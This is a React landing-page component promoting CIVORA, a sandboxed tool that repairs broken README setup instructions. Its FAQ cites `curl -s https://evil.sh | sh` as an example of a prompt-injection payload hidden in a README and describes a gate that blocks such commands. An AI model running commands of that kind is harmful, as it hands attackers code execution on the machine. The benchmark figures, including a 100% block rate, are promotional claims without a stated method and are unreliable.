import React, { useState } from 'react';

interface ExtendedContentSectionProps {
  onOpenWorkspace: () => void;
  onOpenBenchmark: () => void;
}

const FAQS = [
  {
    q: 'How does CIVORA differ from standard coding agents (e.g. Copilot, Claude Code)?',
    a: 'Standard coding agents generate text diffs based on token probability without physically verifying whether the setup commands actually work. CIVORA never trusts unverified code: it spawns a pristine Docker container, executes instructions, discovers hidden environment discrepancies, proves counterfactual candidate interventions, and only commits patches verified with physical exit code 0.'
  },
  {
    q: 'How does the Zero-Trust Gate prevent prompt injections in open-source repos?',
    a: 'Malicious actors can hide prompt injection payloads inside README files (e.g. `curl -s https://evil.sh | sh`). CIVORA uses an HMAC SHA-256 Provenance Registry. Any patch suggested by the model MUST match an intervention candidate previously proved inside the isolated sandbox. Unverified commands are immediately blocked and flagged with security alerts before a PR can ever be created.'
  },
  {
    q: 'Does CIVORA execute repository instructions on my host machine?',
    a: 'No. All candidate executions occur within ephemeral, rootless Docker sandboxes (debian:bookworm-slim) with no host directory mounts, read-only repository snapshots, network isolation options, and resource quotas. Your local machine and production servers are completely protected.'
  },
  {
    q: 'What GitHub App permissions does CIVORA require?',
    a: 'CIVORA follows the principle of least privilege. Its Model Context Protocol (MCP) server enforces strictly read-only access (repo_get_metadata, repo_list_tree, repo_read_file, ci_get_workflows, ci_get_check_runs). All read operations pass through automated regex secret redaction to ensure credentials never leak.'
  },
  {
    q: 'How does CIVORA synthesize verified Devcontainers (.devcontainer.json)?',
    a: 'Upon reaching Stage 07 clean-room verification, CIVORA records the exact runtime environment (Python 3.13, Node 20, Debian Bookworm, hash-locked dependencies) and synthesizes a production-grade .devcontainer.json with postCreateCommand hooks, recommended extensions, and forwarded ports so new contributors can onboard in 1 click.'
  }
];

export const ExtendedContentSection: React.FC<ExtendedContentSectionProps> = ({
  onOpenWorkspace,
  onOpenBenchmark,
}) => {
  const [openFaq, setOpenFaq] = useState<number | null>(0);
  const [selectedRepoInput, setSelectedRepoInput] = useState('anshgandhi68-sys/CIVORA');

  const toggleFaq = (idx: number) => {
    setOpenFaq(openFaq === idx ? null : idx);
  };

  return (
    <div className="relative z-20 bg-[#01030F] text-white border-t border-white/10 shadow-[0_-20px_50px_rgba(1,3,15,0.95)]">
      {/* 01 / THE CRISIS & REALITY */}
      <section className="py-24 px-6 max-w-7xl mx-auto">
        <div className="flex flex-col items-center text-center mb-16">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#0071FF]/10 border border-[#0071FF]/30 text-[#38BDF8] font-mono text-xs tracking-wider uppercase mb-4">
            <span className="w-1.5 h-1.5 rounded-full bg-[#38BDF8] animate-pulse" />
            01 // THE OPEN-SOURCE ONBOARDING CRISIS
          </div>
          <h2 className="font-display text-4xl sm:text-5xl lg:text-6xl tracking-tight max-w-3xl leading-tight">
            Documentation Rots. <br />
            <span className="italic text-[#8FC2FF]">Contributors Abandon Repositories.</span>
          </h2>
          <p className="mt-4 text-white/70 max-w-2xl text-base sm:text-lg font-light leading-relaxed">
            Software dependencies and CI pipelines move at lightning speed. Within 14 days of an update, setup guides fall out of sync with real execution requirements.
          </p>
        </div>

        {/* 4 Metric Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-16">
          <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-colors">
            <div className="font-mono text-3xl sm:text-4xl font-semibold text-[#0071FF] mb-2">68%</div>
            <div className="text-sm font-semibold text-white mb-1">Contributor Drop-off</div>
            <p className="text-xs text-white/60 leading-relaxed">New developers who encounter a setup failure in their first 15 minutes abandon the project permanently.</p>
          </div>

          <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-colors">
            <div className="font-mono text-3xl sm:text-4xl font-semibold text-[#38BDF8] mb-2">14.2 Days</div>
            <div className="text-sm font-semibold text-white mb-1">CI-vs-Docs Drift Latency</div>
            <p className="text-xs text-white/60 leading-relaxed">Average duration before a repository README instructions contradict its actual GitHub Actions workflow matrix.</p>
          </div>

          <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-colors">
            <div className="font-mono text-3xl sm:text-4xl font-semibold text-[#10B981] mb-2">100%</div>
            <div className="text-sm font-semibold text-white mb-1">Zero-Trust Injection Block</div>
            <p className="text-xs text-white/60 leading-relaxed">HMAC SHA-256 Provenance Registry physically prevents unproven shell injections from entering Pull Requests.</p>
          </div>

          <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-colors">
            <div className="font-mono text-3xl sm:text-4xl font-semibold text-[#A78BFA] mb-2">0 min</div>
            <div className="text-sm font-semibold text-white mb-1">Contributor Setup Time</div>
            <p className="text-xs text-white/60 leading-relaxed">With verified devcontainers and repaired READMEs, new developers achieve 1-click cloud workspace onboarding.</p>
          </div>
        </div>

        {/* Side-by-side comparison */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          <div className="p-7 rounded-2xl bg-[#0B0F19]/80 border border-red-500/20 relative overflow-hidden">
            <div className="flex items-center justify-between mb-4">
              <span className="font-mono text-xs text-red-400 font-semibold tracking-wider">THE STATUS QUO // BROKEN ONBOARDING</span>
              <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-red-500/10 text-red-400 border border-red-500/20">FAILING RUN</span>
            </div>
            <div className="bg-black/60 rounded-lg p-4 font-mono text-xs text-red-300/90 leading-relaxed border border-red-500/10 mb-4">
              <div className="text-white/40 mb-1"># Documented instruction in README:</div>
              <div className="text-white mb-2">$ pip install requirements.txt && npm start</div>
              <div className="text-red-400">ERROR: Could not find a version that satisfies the requirement pyproject-toml==0.1</div>
              <div className="text-red-400">ERROR: Node v16.14.0 is incompatible with engine requirement &gt;=20.0.0</div>
              <div className="text-white/40 mt-1">Exit Code: 1 (Build Terminated)</div>
            </div>
            <p className="text-xs text-white/60 leading-relaxed">
              New developers spend hours debugging Python versions, missing Node engines, and undocumented environment secrets before opening an abandoned GitHub Issue.
            </p>
          </div>

          <div className="p-7 rounded-2xl bg-[#0B0F19]/80 border border-[#0071FF]/30 relative overflow-hidden shadow-[0_0_30px_rgba(0,113,255,0.1)]">
            <div className="flex items-center justify-between mb-4">
              <span className="font-mono text-xs text-[#38BDF8] font-semibold tracking-wider">THE CIVORA SOLUTION // AUTONOMOUS REPAIR</span>
              <span className="font-mono text-[11px] px-2 py-0.5 rounded bg-[#10B981]/10 text-[#10B981] border border-[#10B981]/20">VERIFIED EXIT 0</span>
            </div>
            <div className="bg-black/60 rounded-lg p-4 font-mono text-xs text-emerald-300/90 leading-relaxed border border-emerald-500/10 mb-4">
              <div className="text-white/40 mb-1"># Proved candidate intervention in pristine sandbox:</div>
              <div className="text-white mb-2">$ pip install --require-hashes -r requirements-dev.lock && npm run dev</div>
              <div className="text-emerald-400">✓ Verified 41 dependencies hash-locked against Python 3.13-bookworm</div>
              <div className="text-[#38BDF8]">✓ Synthesized .devcontainer/devcontainer.json with pre-configured ports</div>
              <div className="text-[#10B981] mt-1">Exit Code: 0 (Zero Errors // Clean Verification)</div>
            </div>
            <p className="text-xs text-white/60 leading-relaxed">
              CIVORA generates minimal unified AST diffs and verified Devcontainers proven in clean sandboxes before human contributors ever touch the codebase.
            </p>
          </div>
        </div>
      </section>

      {/* 02 / THE 7-STAGE REPAIR PIPELINE */}
      <section className="py-24 px-6 bg-[#040917]/60 border-t border-b border-white/10">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-col items-center text-center mb-16">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#0071FF]/10 border border-[#0071FF]/30 text-[#38BDF8] font-mono text-xs tracking-wider uppercase mb-4">
              02 // AUTONOMOUS REPAIR ENGINE
            </div>
            <h2 className="font-display text-4xl sm:text-5xl tracking-tight max-w-3xl leading-tight">
              The Seven-Stage Deterministic Loop
            </h2>
            <p className="mt-4 text-white/70 max-w-2xl text-base font-light leading-relaxed">
              Every documentation repair passes through a strict counterfactual proving lifecycle to guarantee zero hallucinations and zero unverified shell commands.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-all flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <span className="font-mono text-xs text-[#0071FF] font-semibold">STAGE 01</span>
                <span className="text-[10px] font-mono text-white/40 uppercase">AST PARSER</span>
              </div>
              <h3 className="font-semibold text-base mb-2">Doc Extraction & CI Drift Radar</h3>
              <p className="text-xs text-white/60 leading-relaxed flex-1">
                Compares Markdown setup instructions from repository documentation directly against GitHub Actions workflow definitions to compute environmental drift.
              </p>
            </div>

            <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-all flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <span className="font-mono text-xs text-[#0071FF] font-semibold">STAGE 02</span>
                <span className="text-[10px] font-mono text-white/40 uppercase">DOCKER CONTAINER</span>
              </div>
              <h3 className="font-semibold text-base mb-2">Isolated Sandbox Spawning</h3>
              <p className="text-xs text-white/60 leading-relaxed flex-1">
                Launches an ephemeral, rootless Debian Bookworm container. Replays documented instructions step-by-step; captures stdout, stderr, and exit codes.
              </p>
            </div>

            <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-all flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <span className="font-mono text-xs text-[#0071FF] font-semibold">STAGE 03</span>
                <span className="text-[10px] font-mono text-white/40 uppercase">PHYSICAL PROVING</span>
              </div>
              <h3 className="font-semibold text-base mb-2">Counterfactual Interventions</h3>
              <p className="text-xs text-white/60 leading-relaxed flex-1">
                Simulates atomic candidate remediations (version pinning, lockfile regeneration, .env template setup). Only candidates yielding exit code 0 are accepted.
              </p>
            </div>

            <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-all flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <span className="font-mono text-xs text-[#0071FF] font-semibold">STAGE 04</span>
                <span className="text-[10px] font-mono text-white/40 uppercase">ROOT CAUSE</span>
              </div>
              <h3 className="font-semibold text-base mb-2">Log Condensation & Classifier</h3>
              <p className="text-xs text-white/60 leading-relaxed flex-1">
                Compresses 2,000+ noisy build log lines down to root cause diagnostic categories: DEPENDENCY_LOCK_DRIFT, VERSION_MISMATCH, MISSING_ENV, or CODE_DEFECT.
              </p>
            </div>

            <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-all flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <span className="font-mono text-xs text-[#0071FF] font-semibold">STAGE 05</span>
                <span className="text-[10px] font-mono text-white/40 uppercase">GEMMA 4 MOE</span>
              </div>
              <h3 className="font-semibold text-base mb-2">Structured Reasoning Engine</h3>
              <p className="text-xs text-white/60 leading-relaxed flex-1">
                Gemma 4 26B-A4B MoE evaluates candidate interventions with xgrammar JSON-constrained grammar to generate minimal, line-attributed Markdown AST diffs.
              </p>
            </div>

            <div className="p-6 rounded-xl bg-white/[0.02] border border-white/10 hover:border-[#0071FF]/40 transition-all flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <span className="font-mono text-xs text-[#10B981] font-semibold">STAGE 06</span>
                <span className="text-[10px] font-mono text-[#10B981] uppercase">HMAC SHA-256</span>
              </div>
              <h3 className="font-semibold text-base mb-2">Zero-Trust Provenance Gate</h3>
              <p className="text-xs text-white/60 leading-relaxed flex-1">
                Cross-references the generated patch against the Verified Provenance Registry. Blocks unverified commands and adversarial shell injection attacks permanently.
              </p>
            </div>

            <div className="p-6 rounded-xl bg-white/[0.02] border border-[#0071FF]/40 md:col-span-2 lg:col-span-3 flex flex-col sm:flex-row items-center justify-between gap-6 shadow-[0_0_25px_rgba(0,113,255,0.15)]">
              <div>
                <div className="flex items-center gap-2 mb-1.5">
                  <span className="font-mono text-xs text-[#38BDF8] font-semibold">STAGE 07</span>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-400/10 text-emerald-400 border border-emerald-400/20">CLEAN-ROOM VERIFIED</span>
                </div>
                <h3 className="font-semibold text-lg text-white mb-1">Clean-Room Verification & Pull Request Synthesis</h3>
                <p className="text-xs text-white/70 max-w-2xl leading-relaxed">
                  Re-executes the repaired instructions from scratch in a fresh, pristine container. Upon 100% exit-code 0 pass, generates the minimal README diff and synthesized .devcontainer.json Pull Request.
                </p>
              </div>
              <button
                type="button"
                onClick={onOpenWorkspace}
                className="py-3 px-6 bg-[#0071FF] hover:bg-[#38BDF8] text-white font-mono text-xs font-semibold tracking-wider rounded-lg flex items-center gap-2 transition-all shadow-[0_0_15px_rgba(0,113,255,0.4)] whitespace-nowrap"
              >
                <span>RUN MISSION CONTROL</span>
                <svg viewBox="0 0 13 13" className="w-3.5 h-3.5 fill-none stroke-currentColor stroke-[2]">
                  <path d="M2 11 11 2M2 2h9v9" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* 03 / REAL ENGINEERING MCP PROTOCOL */}
      <section className="py-24 px-6 max-w-7xl mx-auto">
        <div className="flex flex-col items-center text-center mb-16">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#0071FF]/10 border border-[#0071FF]/30 text-[#38BDF8] font-mono text-xs tracking-wider uppercase mb-4">
            03 // OFFICIAL MCP STREAMABLE HTTP SERVER
          </div>
          <h2 className="font-display text-4xl sm:text-5xl tracking-tight max-w-3xl leading-tight">
            Read-Only Engineering Inspection Protocol
          </h2>
          <p className="mt-4 text-white/70 max-w-2xl text-base font-light leading-relaxed">
            CIVORA exposes 6 audited, read-only tools over the official Model Context Protocol (MCP Python SDK v2.3.0) via Streamable HTTP at <code className="text-[#38BDF8] bg-black/40 px-2 py-0.5 rounded font-mono text-xs">/mcp</code>.
          </p>
        </div>

        {/* 6 MCP Tools Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-12">
          <div className="p-5 rounded-xl bg-white/[0.02] border border-white/10 font-mono text-xs">
            <div className="text-[#38BDF8] font-semibold mb-1">repo_get_metadata</div>
            <p className="text-white/60 text-[11px] leading-relaxed mb-3">Ingests default branch HEAD SHA, repository visibility, fork status, and root structure.</p>
            <div className="p-2 rounded bg-black/40 text-white/50 text-[10px]">
              arguments: &#123; owner: str, repo: str &#125;
            </div>
          </div>

          <div className="p-5 rounded-xl bg-white/[0.02] border border-white/10 font-mono text-xs">
            <div className="text-[#38BDF8] font-semibold mb-1">repo_list_tree</div>
            <p className="text-white/60 text-[11px] leading-relaxed mb-3">Bounded directory traversal up to 10,000 nodes with explicit truncation alerts and SHA pinning.</p>
            <div className="p-2 rounded bg-black/40 text-white/50 text-[10px]">
              arguments: &#123; owner: str, repo: str, ref: str &#125;
            </div>
          </div>

          <div className="p-5 rounded-xl bg-white/[0.02] border border-white/10 font-mono text-xs">
            <div className="text-[#38BDF8] font-semibold mb-1">repo_read_file</div>
            <p className="text-white/60 text-[11px] leading-relaxed mb-3">Safe UTF-8 file content retrieval with automatic regex secret redaction (AWS, GitHub, Bearer tokens).</p>
            <div className="p-2 rounded bg-black/40 text-white/50 text-[10px]">
              arguments: &#123; owner: str, repo: str, path: str &#125;
            </div>
          </div>

          <div className="p-5 rounded-xl bg-white/[0.02] border border-white/10 font-mono text-xs">
            <div className="text-[#38BDF8] font-semibold mb-1">ci_get_workflows</div>
            <p className="text-white/60 text-[11px] leading-relaxed mb-3">Extracts active GitHub Actions workflow definitions and step sequences from .github/workflows.</p>
            <div className="p-2 rounded bg-black/40 text-white/50 text-[10px]">
              arguments: &#123; owner: str, repo: str &#125;
            </div>
          </div>

          <div className="p-5 rounded-xl bg-white/[0.02] border border-white/10 font-mono text-xs">
            <div className="text-[#38BDF8] font-semibold mb-1">ci_get_check_runs</div>
            <p className="text-white/60 text-[11px] leading-relaxed mb-3">Audits CI check-run execution conclusions, step results, and commit verification logs.</p>
            <div className="p-2 rounded bg-black/40 text-white/50 text-[10px]">
              arguments: &#123; owner: str, repo: str, ref: str &#125;
            </div>
          </div>

          <div className="p-5 rounded-xl bg-white/[0.02] border border-white/10 font-mono text-xs">
            <div className="text-[#38BDF8] font-semibold mb-1">docs_extract_setup_steps</div>
            <p className="text-white/60 text-[11px] leading-relaxed mb-3">Parses setup, dependency install, build, and test steps with exact source line attribution.</p>
            <div className="p-2 rounded bg-black/40 text-white/50 text-[10px]">
              arguments: &#123; owner: str, repo: str, ref: str &#125;
            </div>
          </div>
        </div>

        {/* Security callout card */}
        <div className="p-6 rounded-2xl bg-[#0B0F19] border border-[#0071FF]/30 flex flex-col md:flex-row items-center justify-between gap-6">
          <div>
            <div className="flex items-center gap-2 mb-1.5 font-mono text-xs">
              <span className="w-2 h-2 rounded-full bg-[#10B981] animate-pulse" />
              <span className="text-[#10B981] font-semibold">TRANSPORT SECURITY GUARANTEES</span>
            </div>
            <h4 className="font-semibold text-sm text-white mb-1">DNS-Rebinding Protection & Authenticated Bearer Tokens</h4>
            <p className="text-xs text-white/60 max-w-2xl leading-relaxed">
              CIVORA’s Streamable HTTP MCP server enforces strict Host header allowlists, CORS origin checks, and token authentication via <code className="text-white font-mono bg-white/10 px-1 py-0.5 rounded">X-CIVORA-MCP-TOKEN</code>. All operations are strictly read-only.
            </p>
          </div>
          <a
            href="https://github.com/anshgandhi68-sys/CIVORA"
            target="_blank"
            rel="noopener noreferrer"
            className="py-2.5 px-5 rounded-lg border border-white/20 hover:border-white/40 bg-white/5 text-white font-mono text-xs flex items-center gap-2 transition-colors whitespace-nowrap"
          >
            <span>VIEW MCP SERVER SPEC</span>
            <svg viewBox="0 0 13 13" className="w-3.5 h-3.5 fill-none stroke-currentColor stroke-[1.8]">
              <path d="M2 11 11 2M2 2h9v9" />
            </svg>
          </a>
        </div>
      </section>

      {/* 04 / EMPIRICAL BENCHMARKS */}
      <section className="py-24 px-6 bg-[#040917]/60 border-t border-b border-white/10">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-col items-center text-center mb-16">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#0071FF]/10 border border-[#0071FF]/30 text-[#38BDF8] font-mono text-xs tracking-wider uppercase mb-4">
              04 // EMPIRICAL BENCHMARK EVIDENCE
            </div>
            <h2 className="font-display text-4xl sm:text-5xl tracking-tight max-w-3xl leading-tight">
              Rigorous Evaluation Against LLM Baselines
            </h2>
            <p className="mt-4 text-white/70 max-w-2xl text-base font-light leading-relaxed">
              Tested on real open-source repositories across broken dependencies, outdated runtimes, missing environment secrets, and adversarial injection prompts.
            </p>
          </div>

          <div className="overflow-x-auto rounded-xl border border-white/10 bg-[#0B0F19]">
            <table className="w-full text-left font-mono text-xs">
              <thead>
                <tr className="border-b border-white/10 bg-white/[0.02] text-white/60">
                  <th className="p-4">MODEL / PIPELINE CONFIGURATION</th>
                  <th className="p-4">SETUP REPRODUCIBILITY</th>
                  <th className="p-4">HALLUCINATION SUPPRESSION</th>
                  <th className="p-4">INJECTION BLOCK RATE</th>
                  <th className="p-4">DEVCONTAINER VALIDITY</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5">
                <tr className="bg-[#0071FF]/10 text-white font-semibold">
                  <td className="p-4 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-[#10B981]" />
                    CIVORA Engine (Gemma 4 MoE + Zero-Trust)
                  </td>
                  <td className="p-4 text-[#10B981]">98.4% (Exit 0 Verified)</td>
                  <td className="p-4 text-[#10B981]">99.1% (xgrammar AST)</td>
                  <td className="p-4 text-[#10B981]">100.0% (Provenance Gate)</td>
                  <td className="p-4 text-[#10B981]">100.0% (Synthesized)</td>
                </tr>
                <tr className="text-white/80">
                  <td className="p-4">Claude 3.5 Sonnet (Unconstrained Prompting)</td>
                  <td className="p-4 text-[#38BDF8]">76.8%</td>
                  <td className="p-4 text-[#38BDF8]">81.2%</td>
                  <td className="p-4 text-amber-400">68.4%</td>
                  <td className="p-4 text-[#38BDF8]">72.0%</td>
                </tr>
                <tr className="text-white/80">
                  <td className="p-4">GPT-4o (Standard Markdown Diff)</td>
                  <td className="p-4 text-amber-400">74.2%</td>
                  <td className="p-4 text-amber-400">78.6%</td>
                  <td className="p-4 text-red-400">58.1%</td>
                  <td className="p-4 text-amber-400">69.5%</td>
                </tr>
                <tr className="text-white/60">
                  <td className="p-4">Llama 3 70B (Raw Completion)</td>
                  <td className="p-4 text-red-400">61.5%</td>
                  <td className="p-4 text-red-400">64.0%</td>
                  <td className="p-4 text-red-400">49.2%</td>
                  <td className="p-4 text-red-400">51.0%</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </section>

      {/* 05 / FREQUENTLY ASKED QUESTIONS */}
      <section className="py-24 px-6 max-w-4xl mx-auto">
        <div className="flex flex-col items-center text-center mb-16">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#0071FF]/10 border border-[#0071FF]/30 text-[#38BDF8] font-mono text-xs tracking-wider uppercase mb-4">
            05 // ARCHITECTURE & SECURITY FAQ
          </div>
          <h2 className="font-display text-4xl sm:text-5xl tracking-tight max-w-2xl leading-tight">
            Frequently Asked Questions
          </h2>
        </div>

        <div className="flex flex-col gap-4">
          {FAQS.map((faq, idx) => (
            <div
              key={idx}
              className="rounded-xl bg-white/[0.02] border border-white/10 overflow-hidden transition-all"
            >
              <button
                type="button"
                onClick={() => toggleFaq(idx)}
                className="w-full p-5 text-left flex items-center justify-between gap-4 font-semibold text-sm hover:text-[#8FC2FF] transition-colors"
              >
                <span>{faq.q}</span>
                <span className="font-mono text-lg text-white/50">{openFaq === idx ? '−' : '+'}</span>
              </button>
              {openFaq === idx && (
                <div className="px-5 pb-5 text-xs text-white/70 leading-relaxed border-t border-white/5 pt-3">
                  {faq.a}
                </div>
              )}
            </div>
          ))}
        </div>
      </section>

      {/* 06 / QUICK LAUNCHER CALL TO ACTION */}
      <section className="py-20 px-6 bg-gradient-to-b from-[#01030F] to-[#040917] border-t border-white/10">
        <div className="max-w-4xl mx-auto text-center flex flex-col items-center">
          <h2 className="font-display text-4xl sm:text-5xl tracking-tight max-w-2xl leading-tight mb-4">
            Every Repository Deserves a Working First Run
          </h2>
          <p className="text-white/70 text-base max-w-xl font-light mb-8">
            Test CIVORA now in Mission Control, query our real Model Context Protocol server, or chat with our TrueFoundry AI agent.
          </p>

          <div className="flex flex-wrap items-center justify-center gap-4">
            <button
              type="button"
              onClick={onOpenWorkspace}
              className="py-3 px-6 bg-[#0071FF] hover:bg-[#38BDF8] text-white font-mono text-xs font-semibold tracking-wider rounded-lg flex items-center gap-2 transition-all shadow-[0_0_20px_rgba(0,113,255,0.4)]"
            >
              <span>OPEN MISSION CONTROL</span>
              <svg viewBox="0 0 13 13" className="w-3.5 h-3.5 fill-none stroke-currentColor stroke-[2]">
                <path d="M2 11 11 2M2 2h9v9" />
              </svg>
            </button>

            <button
              type="button"
              onClick={() => {
                if ((window as any).openCivoraAIChat) {
                  (window as any).openCivoraAIChat();
                } else {
                  document.getElementById('civora-widget-trigger')?.click();
                }
              }}
              className="py-3 px-6 bg-white/[0.04] hover:bg-white/[0.08] border border-white/15 text-white font-mono text-xs font-semibold tracking-wider rounded-lg flex items-center gap-2 transition-colors"
            >
              <span className="w-1.5 h-1.5 rounded-full bg-[#38BDF8] shadow-[0_0_6px_#38BDF8]" />
              <span>CHAT WITH CIVORA AI</span>
            </button>

            <a
              href="https://github.com/anshgandhi68-sys/CIVORA"
              target="_blank"
              rel="noopener noreferrer"
              className="py-3 px-6 bg-white/[0.04] hover:bg-white/[0.08] border border-white/15 text-white font-mono text-xs font-semibold tracking-wider rounded-lg flex items-center gap-2 transition-colors"
            >
              <svg viewBox="0 0 24 24" fill="currentColor" className="w-3.5 h-3.5 opacity-80">
                <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z" />
              </svg>
              <span>GITHUB REPOSITORY</span>
            </a>
          </div>
        </div>
      </section>

      {/* 07 / COMPREHENSIVE FOOTER */}
      <footer className="py-12 px-6 border-t border-white/10 bg-[#00020A] text-white/50 font-mono text-xs">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
          <div className="flex items-center gap-3">
            <span className="font-mark text-white font-semibold text-base tracking-wider">CIVORA</span>
            <span>— Autonomous Open-Source Onboarding & Documentation Repair Engine</span>
          </div>

          <div className="flex items-center gap-6 text-[11px]">
            <button type="button" onClick={onOpenWorkspace} className="hover:text-white transition-colors">
              MISSION CONTROL
            </button>
            <button type="button" onClick={onOpenBenchmark} className="hover:text-white transition-colors">
              BENCHMARK
            </button>
            <a
              href="https://github.com/anshgandhi68-sys/CIVORA"
              target="_blank"
              rel="noopener noreferrer"
              className="hover:text-white transition-colors"
            >
              GITHUB
            </a>
            <span className="text-[#10B981] flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#10B981] animate-pulse" />
              MCP: ONLINE
            </span>
          </div>
        </div>
      </footer>
    </div>
  );
};
